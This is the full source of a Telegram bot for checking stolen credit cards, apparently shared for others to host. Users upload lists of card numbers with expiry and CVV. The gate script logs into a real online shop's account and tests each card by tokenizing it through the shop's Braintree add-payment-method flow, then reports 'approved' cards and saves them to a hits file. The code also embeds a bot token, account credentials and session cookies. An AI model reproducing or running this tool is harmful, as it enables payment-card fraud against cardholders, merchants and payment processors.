#main.py 
  
import requests, re #import 
from hh import keep_alive
try:
  import telebot
except:
  import os
  os.system("pip install pyTelegramBotAPI")
from telebot import *
from GATEAU import Tele
from colorama import Fore
 
allowed_ids = [5358905636 ]#Replace Your Ids 
 
sto = {"stop": True}
token = "6471753306:AAGFBMXuexdpNHuEOANyBHwnB1VWvsmUxJw"#replace 
bot = telebot.TeleBot(token, parse_mode="HTML")
 
 
@bot.message_handler(commands=["stop"])
def start(message):
  sto.update({"stop": True})
  bot.reply_to(message,
               '𝐼 𝑠𝑡𝑜𝑝𝑝𝑒𝑑 𝑡𝒉𝑒 𝑐𝑜𝑚𝑏𝑜 𝑓𝑜𝑟 𝑦𝑜𝑢, 𝑤𝑖𝑡𝒉 𝑦𝑜𝑢𝑟 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛. 𝑊𝑎𝑖𝑡 10𝑠')
 
 
@bot.message_handler(commands=["start"])
def start(message):
  bot.send_message(message.chat.id,
                   "   Send your combo txt file now".format(
                       message.chat.first_name),
                   reply_markup=telebot.types.InlineKeyboardMarkup())
 
 
@bot.message_handler(content_types=["document"])
def main(message):
  first_name = message.from_user.first_name
  name = f"{first_name} "
  risk = 0
  bad = 0
  nok = 0
  ok = 0
  ko = (bot.reply_to(
      message,
      f" WELCOME {name}  NOW I WILL BE CHECKING YOUR CARDS  ||  Owner:- @Rar_XD ").message_id)
  ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
  with open("combo.txt", "wb") as w:
    w.write(ee)
  print(message.chat.id)
  sto.update({"stop": True})
  if message.chat.id in allowed_ids:
    with open("combo.txt") as file:
      lino = file.readlines()
      lino = [line.rstrip() for line in lino]
      total = len(lino)
      for cc in lino:
        if sto["stop"] == True:
          pass
        else:
          break
        bin = cc[:6]
        url = f"https://lookup.binlist.net/{bin}"
        try:
          req = requests.get(url).json()
        except:
          pass
        try:
          inf = req['scheme']
        except:
          inf = "------------"
        try:
          type = req['type']
        except:
          type = "-----------"
        try:
          brand = req['brand']
        except:
          brand = '-----'
        try:
          info = inf + '-' + type + '-' + brand
        except:
          info = "CREDIT-CORPORATE"
        try:
          ii = info.upper()
        except:
          ii = "----------"
        try:
          bank = req['bank']['name'].upper()
        except:
          bank = "CAPITAL ONE"
        try:
          do = req['country']['name'] + ' ' + req['country']['emoji'].upper()
        except:
          do = "-----------"
        mes = types.InlineKeyboardMarkup(row_width=1)
        GALD1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
        ##GALD2 = types.InlineKeyboardButton(f"• {cc} •",callback_data='u1')
        GALD3 = types.InlineKeyboardButton(f"• 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ : [ {ok} ] •",
                                           callback_data='u2')
        GALD4 = types.InlineKeyboardButton(f"• 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌  : [ {bad} ] •",
                                           callback_data='u1')
        risk6 = types.InlineKeyboardButton(f"• 𝗥𝗜𝗦𝗞 🥲  : [ {risk} ] •",
                                           callback_data='u1')
        GALD5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟   : [ {total} ] •",
                                           callback_data='u1')
        mes.add(GALD1, GALD3, GALD4, risk6, GALD5)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text=f''' 𓆩 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𓆪ꪾ  {name}, 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱...⌛💸
    ''',
            parse_mode='markdown',
            reply_markup=mes)
 
        try:
          last = str(Tele(cc))
        except Exception as e:
          print(e)
          try:
            last = str(Tele(cc))
          except Exception as e:
            print(e)
            bot.reply_to(message, f"𝑪𝑨𝑹𝑫 𝑰𝑺 𝑫𝑬𝑨𝑫 𝑨𝑵𝑫 𝑰 𝑺𝑲𝑰𝑷𝑷𝑬𝑫 >> {cc}")
        if "risk" in last:
          risk += 1
          print(Fore.YELLOW + cc + "->" + Fore.CYAN + last)
        elif "Insufficient Funds" in last:
          ok += 1
          respo = f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
──────────────────
[↯] 𝗖𝗖 ★ {cc}
[↯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ 𝙰𝚞𝚝𝚑
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱ꪜ 
──────────────────
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
[↯] 𝗕𝗮𝗻𝗸: {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
──────────────────
 
[↯] 𝗕𝗢𝗧 𝗕𝗬: @Rar_XD || DIWAS 
[↯] 𝗣𝗥𝗢𝗫𝗬 : 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
──────────────────
'''
          print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
          bot.reply_to(message, respo)
          with open("hit.txt", "a") as f:
            f.write(f'''
±++++++++++++++++++++++++++++
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
──────────────────
[↯] 𝗖𝗖 ★ {cc}
[↯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ 𝙰𝚞𝚝𝚑
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱ꪜ 
──────────────────
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
[↯] 𝗕𝗮𝗻𝗸: {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
──────────────────
 
[↯] 𝗕𝗢𝗧 𝗕𝗬: @Rar_Xd || Diwas 
[↯] 𝗣𝗥𝗢𝗫𝗬 : 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
──────────────────''')
        elif "Status code avs: Gateway Rejected: avs" in last or "Nice! New payment method added:" in last or "Status code 81724: Duplicate card exists in the vault." in last:
          ok += 1
          respo = (f'''
━━━━[🌹𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅🌹]━━━━
<a >━━━━━━━━━━━━━━━━━━</a>
<a >[↯]</a> 𝗖𝗖 ★ <code>{cc}</code>
<a >[↯]</a> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ 𝙰𝚞𝚝𝚑
<a >[↯]</a> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱ꪜ
<a >━━━━━━━━━━━━━━━━━━</a>
<a >[↯]</a> 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯ <code>{ii}</code>
<a >[↯]</a> 𝗕𝗮𝗻𝗸 ↯ <code>{bank}</code>
<a >[↯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>{do}</code>
<a >━━━━━━━━━━━━━━━━━━</a>
<a >[↯]</a> 𝗕𝗢𝗧 𝗕𝗬 ↯ <a href='t.me/team_falcone'>Diwas</a>
<a >[↯]</a> 𝗣𝗥𝗢𝗫𝗬  ↯ <code>𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]</code>
<a >━━━━━━━━━━━━━━━━━━</a>''')
          print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
          bot.reply_to(message, respo)
          with open("hit.txt", "a") as f:
            f.write(f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
──────────────────
[↯] 𝗖𝗖 ★ {cc}
[↯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ 𝙰𝚞𝚝𝚑
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱ꪜ 
──────────────────
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
[↯] 𝗕𝗮𝗻𝗸: {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
──────────────────
[↯] 𝗕𝗢𝗧 𝗕𝗬: hackerworld69
[↯] 𝗣𝗥𝗢𝗫𝗬 : 𝗟𝗶𝘃����[1XX.XX.XX 🟢]
──────────────────''')
        else:
          bad += 1
          print(Fore.YELLOW + cc + "->" + Fore.RED + last)
      if sto["stop"] == True:
        bot.reply_to(message, 'X')
  else:
    bot.reply_to(
        message,
        "you're not premium user  \n paid premium plan  \n Not for Sell")
 
 
keep_alive()
print("STARTED BOT @Rar_Xd || Diwas ")
bot.infinity_polling()
 
# this is all coded py )
 
 
----------------------
 
gate.py 
👇️
 
( 
import requests,re,random,time,string,base64
from bs4 import BeautifulSoup#very imp 
 
def Tele(cx):
    cc = cx.split("|")[0]
    bin=cc[:6]
    mes = cx.split("|")[1]
    ano = cx.split("|")[2]
    cvv = cx.split("|")[3]
    if "20" in ano:
        ano = ano.split("20")[1]
    r=requests.session()
    heaf={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}
    get=r.get("https://www.woolroots.com/my-account/",headers=heaf)
    login=re.findall(r'name="woocommerce-login-nonce" value="(.*?)"',get.text)[0]
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check',
    'Origin': 'https://www.woolroots.com',
    'Referer': 'https://www.woolroots.com/my-account/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
 
    data = {
    'username': 'DiwasBhai',
    'password': 'Rar_XD@',
    'woocommerce-login-nonce': login,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}
 
    response = r.post('https://www.woolroots.com/my-account/', headers=headers, data=data)
 
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
 
    response = r.get('https://www.woolroots.com/my-account/add-payment-method/',headers=headers)
#print(response.text)
    no=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
    cookies = {
    'wordpress_sec_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7C868703aa5b50efdaf3ffc942cec7a4b4fca527b74db6e549b83eeeb00e469ba6',
    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
    'cmplz_consented_services': '',
    'cmplz_policy_id': '12',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    'nm-wishlist-ids': '[]',
    'wordpress_test_cookie': 'WP+Cookie+check',
    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
}
 
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'wordpress_sec_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7C868703aa5b50efdaf3ffc942cec7a4b4fca527b74db6e549b83eeeb00e469ba6; _swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Origin': 'https://www.woolroots.com',
    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
 
    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': no,
}
 
    response = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', headers=headers, data=data)
    #print(response.text)
    token=re.findall(r'"data":"(.*?)"',response.text)[0]
    encoded_text = token
    decoded_text = base64.b64decode(encoded_text).decode('utf-8')
    au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
    #print(au)
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
 
    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '89d615c6-0350-481e-a35e-863af6c62f3e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
 
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token=response.json()['data']['tokenizeCreditCard']['token']
    gh={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}
    ges=r.get("https://www.woolroots.com/my-account/add-payment-method/",headers=gh)
    pay=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',ges.text)[0]
    cookies = {
    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
    'cmplz_consented_services': '',
    'cmplz_policy_id': '12',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    'nm-wishlist-ids': '[]',
    'wordpress_test_cookie': 'WP+Cookie+check',
    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
}
 
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    #and dont add (#) # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Origin': 'https://www.woolroots.com',
    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
 
    data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': token,
    'wc_braintree_device_data': '{"correlation_id":"5d4a458e9fb8b6cd05da33e61448f27a"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': pay,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
 
    time.sleep(25)
    response = r.post('https://www.woolroots.com/my-account/add-payment-method/', headers=headers, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:  
      msg = soup.find('i', class_='nm-font nm-font-close').parent.text.strip()
    except:
      return "Status code avs: Gateway Rejected: avs"
    try:
    	if "Status code avs: Gateway Rejected: avs" in msg:
    		return msg
    except:
    	return "Status code avs:"
    else:
    	return msg
 
    	#done all requsst has been saved now host your bot on vps / rdp :( ) ) 
 
 
-----------------
 
hh.py 
👇️
 
( 
from flask import Flask
from threading import Thread
 
app = Flask('')
 
 
@app.route('/')
def home():
  return "<b> hello || dev ::-- @Rar_Xd || </b>"
 
def run():
  app.run(host='0.0.0.0', port=8081)
 
 
def keep_alive():
  t = Thread(target=run)
  t.start() 
) 
